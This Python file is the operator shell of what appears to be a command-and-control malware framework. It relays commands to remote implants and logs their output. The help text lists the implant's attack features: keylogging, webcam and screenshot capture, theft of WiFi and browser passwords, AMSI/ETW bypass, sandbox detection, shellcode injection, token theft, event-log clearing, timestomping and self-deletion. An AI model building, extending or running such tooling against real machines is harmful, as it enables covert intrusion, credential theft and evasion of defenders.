import os
import time

from server.ui.prompt import (
    green, blue, cyan, yellow, dim, bold, magenta,
    print_colored, highlight_output,
)
from server.ui.completer import C2Completer, setup_readline, save_history


class AgentShell:
    def __init__(self, router, ctx, agent_id, loot_dir, commands):
        self._router = router
        self._ctx = ctx
        self._agent_id = agent_id
        self._loot_dir = loot_dir
        self._running = True
        self._aliases = {
            'll': 'ls',
            'la': 'ls',
            'cls': 'clear',
            'exit': 'quit',
            'q': 'quit',
            '?': 'help',
            'dir': 'ls',
            'del': 'rm',
            'ren': 'mv',
        }

        self._help_text = {
            'ls': 'List directory contents. Usage: ls [path]',
            'cd': 'Change working directory. Usage: cd <path>',
            'pwd': 'Print current working directory',
            'rm': 'Delete file or directory. Usage: rm [-r] <path>',
            'mv': 'Move/rename file. Usage: mv <src> <dst>',
            'cat': 'Read file contents. Usage: cat <path>',
            'touch': 'Create empty file. Usage: touch <path>',
            'upload': 'Upload file from server to target. Usage: upload <local_path>',
            'download': 'Download file from target to server. Usage: download <remote_path>',
            'screenshot': 'Capture and download screenshot',
            'webcam': 'Capture and download webcam photo',
            'clipboard': 'Dump target clipboard contents',
            'keylog_start': 'Start keylogger on target',
            'keylog_dump': 'Retrieve captured keystrokes',
            'keylog_stop': 'Stop keylogger and delete log file',
            'sysinfo': 'Gather detailed system information from target',
            'check_admin': 'Check if agent has admin/root privileges',
            'wifi_dump': 'Extract saved WiFi passwords (Windows)',
            'browser_creds': 'Extract Chrome/Edge saved passwords (Windows)',
            'ps': 'List running processes',
            'kill': 'Kill process by PID. Usage: kill <pid>',
            'pkill': 'Kill process by name. Usage: pkill <name>',
            'grep': 'Search recursively in current directory. Usage: grep <pattern>',
            'persistence': 'Manage persistence. Usage: persistence <install|remove|check|list> [method]',
            'evasion': 'Apply AMSI+ETW bypasses and show evasion context',
            'detect_vm': 'Detect VM/Sandbox environment',
            'inject': 'Inject shellcode into process. Usage: inject <pid|name> [shellcode_b64]',
            'steal_token': 'Steal and impersonate process token. Usage: steal_token <pid>',
            'rev2self': 'Revert to original process token',
            'whoami': 'Show current user identity on target',
            'priv_enable': 'Enable token privilege. Usage: priv_enable <PrivilegeName>',
            'clear_logs': 'Clear Windows Event Logs / Linux syslog',
            'timestomp': 'Modify file timestamp. Usage: timestomp <path>',
            'self_delete': 'Delete agent binary from disk',
            'sendall': 'Fire-and-forget command execution',
            'ip addr': 'Show network interface configuration',
            'background': 'Return to master prompt',
            'help': 'Show this help or help <command> for specific help',
            'clear': 'Clear the screen',
            'quit': 'Terminate session with this agent',
        }

        history_dir = os.path.join(loot_dir, '.history')
        history_file = os.path.join(history_dir, f'{agent_id}.history')
        completer = C2Completer()
        completer.set_commands(list(commands))
        setup_readline(completer, history_file)
        self._history_file = history_file

    def run(self):
        from common.logging import get_logger
        logger = get_logger()
        try:
            while self._running:
                prompt = self._build_prompt()
                try:
                    raw = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                command = raw.strip()
                if not command:
                    continue

                command = self._resolve_alias(command)
                self._save_history(command)

                if command == 'help' or command.startswith('help '):
                    self._show_help(command)
                    continue

                if command == 'background':
                    from server.core.background import BackgroundManager
                    bg = BackgroundManager()
                    bg.background(self._ctx, self._agent_id)
                    print_colored(f'[+] {self._agent_id} backgrounded — queue tasks with "queue {self._agent_id} <cmd>"', 'cyan')
                    break

                t0 = time.time()
                result = self._router.dispatch(self._ctx, command)
                local_ms = int((time.time() - t0) * 1000)
                if result is False:
                    self._running = False
                    logger.log_command(self._agent_id, command, '',
                                      response_size=0, duration_ms=local_ms, status='ok')
                    break
                if result is True:
                    logger.log_command(self._agent_id, command, '',
                                      response_size=0, duration_ms=local_ms, status='ok')
                    continue

                self._ctx.protocol.send(command)
                try:
                    t0 = time.time()
                    response = self._ctx.protocol.recv()
                    remote_ms = int((time.time() - t0) * 1000)
                    response_str = str(response)
                    print(highlight_output(response_str))
                    status = 'error' if response_str.startswith('[-]') else 'ok'
                    logger.log_command(self._agent_id, command, response_str,
                                      response_size=len(response_str), duration_ms=remote_ms,
                                      status=status)
                except KeyboardInterrupt:
                    self._ctx.protocol.send('terminate')
                    print_colored('\n[-] Command Terminated', 'yellow')
                    self._ctx.protocol.drain(1.0)
                except (ConnectionError, BrokenPipeError, OSError):
                    print_colored('[-] Connection lost', 'red')
                    self._running = False
        finally:
            save_history(self._history_file)

    def _build_prompt(self) -> str:
        parts = []
        parts.append(f'{blue(self._agent_id)}')
        parts.append(f'{green("@")}')
        parts.append(f'{magenta(self._ctx.ip)}')

        if hasattr(self._ctx, 'user'):
            parts.append(f' {cyan(self._ctx.user)}')

        cwd = getattr(self._ctx, 'cwd', '') or os.getcwd()
        cwd_short = cwd.replace(os.path.expanduser('~'), '~')
        if len(cwd_short) > 40:
            cwd_short = '...' + cwd_short[-37:]
        parts.append(f' {dim("in")} {yellow(cwd_short)}')

        parts.append(f'{bold(">")} ')
        return ''.join(parts)

    def _resolve_alias(self, command: str) -> str:
        first = command.split()[0] if command else ''
        if first in self._aliases:
            return self._aliases[first] + command[len(first):]
        return command

    def _show_help(self, command: str):
        parts = command.split(None, 1)
        if len(parts) == 2:
            cmd = parts[1]
            if cmd in self._help_text:
                print_colored(f'\n  {cmd} — {self._help_text[cmd]}\n', 'cyan')
            elif cmd in self._aliases:
                real = self._aliases[cmd]
                print_colored(f'  {cmd} → {real}', 'dim')
            else:
                print_colored(f'  No help for: {cmd}', 'red')
            return

        from server.handlers.local_commands import handle_help
        handle_help()

    def _save_history(self, command: str):
        pass


def build_master_completer():
    comp = C2Completer()
    comp.set_commands(['agents', 'interact', 'broadcast', 'help', 'exit', 'quit', 'listeners'])
    return comp
